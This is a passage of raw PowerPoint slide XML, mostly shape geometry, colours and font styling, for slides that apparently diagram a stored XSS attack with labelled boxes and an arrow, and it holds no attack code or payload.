              <a:gd name="T59" fmla="*/ 157 h 471170"/>
              <a:gd name="T60" fmla="*/ 869 w 471170"/>
              <a:gd name="T61" fmla="*/ 279 h 471170"/>
              <a:gd name="T62" fmla="*/ 935 w 471170"/>
              <a:gd name="T63" fmla="*/ 436 h 471170"/>
              <a:gd name="T64" fmla="*/ 989 w 471170"/>
              <a:gd name="T65" fmla="*/ 622 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="449552" y="137685"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="464888" y="182834"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470745" y="228730"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="467591" y="274118"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="455895" y="317745"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="436126" y="358355"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="408751" y="394696"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="374239" y="425513"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="333059" y="449552"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="287910" y="464888"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="242014" y="470745"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="196626" y="467591"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152999" y="455895"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112389" y="436126"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76048" y="408751"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45231" y="374239"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21192" y="333059"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5856" y="287910"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="242014"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3153" y="196626"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14849" y="152999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34619" y="112389"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61993" y="76048"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96505" y="45231"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="137685" y="21193"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="182834" y="5856"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="228730" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="274118" y="3153"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="317745" y="14849"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="358355" y="34619"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="394696" y="61993"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="425513" y="96505"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="449552" y="137685"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25399">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="object 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1200000">
            <a:off x="4685460" y="3290521"/>
            <a:ext cx="358588" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2409"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr sz="2471" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162839" name="object 24"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8110258" y="5427850"/>
            <a:ext cx="334776" cy="320768"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId7"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162840" name="object 25"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8135471" y="5436254"/>
            <a:ext cx="282949" cy="267540"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId8"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162841" name="object 26"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8135471" y="5436254"/>
            <a:ext cx="284350" cy="267540"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 415290"/>
              <a:gd name="T1" fmla="*/ 0 h 379729"/>
              <a:gd name="T2" fmla="*/ 944 w 415290"/>
              <a:gd name="T3" fmla="*/ 0 h 379729"/>
              <a:gd name="T4" fmla="*/ 944 w 415290"/>
              <a:gd name="T5" fmla="*/ 1713 h 379729"/>
              <a:gd name="T6" fmla="*/ 0 w 415290"/>
              <a:gd name="T7" fmla="*/ 1713 h 379729"/>
              <a:gd name="T8" fmla="*/ 0 w 415290"/>
              <a:gd name="T9" fmla="*/ 0 h 3797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15290" h="379729">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="415086" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415086" y="379399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="379399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="28" name="Straight Arrow Connector 27"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4088747" y="3281924"/>
            <a:ext cx="3332349" cy="1368518"/>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12737948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295931" y="71438"/>
            <a:ext cx="5593136" cy="678968"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr spc="-21" dirty="0"/>
              <a:t>Stored </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-311" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-11" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="49" dirty="0"/>
              <a:t>attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163843" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2794468" y="2996174"/>
            <a:ext cx="1294279" cy="1392331"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163844" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="3004578"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163845" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="3004578"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 3763 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 3763 w 1821814"/>
              <a:gd name="T5" fmla="*/ 8138 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 8138 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821218" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821218" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3545262"/>
            <a:ext cx="890868" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
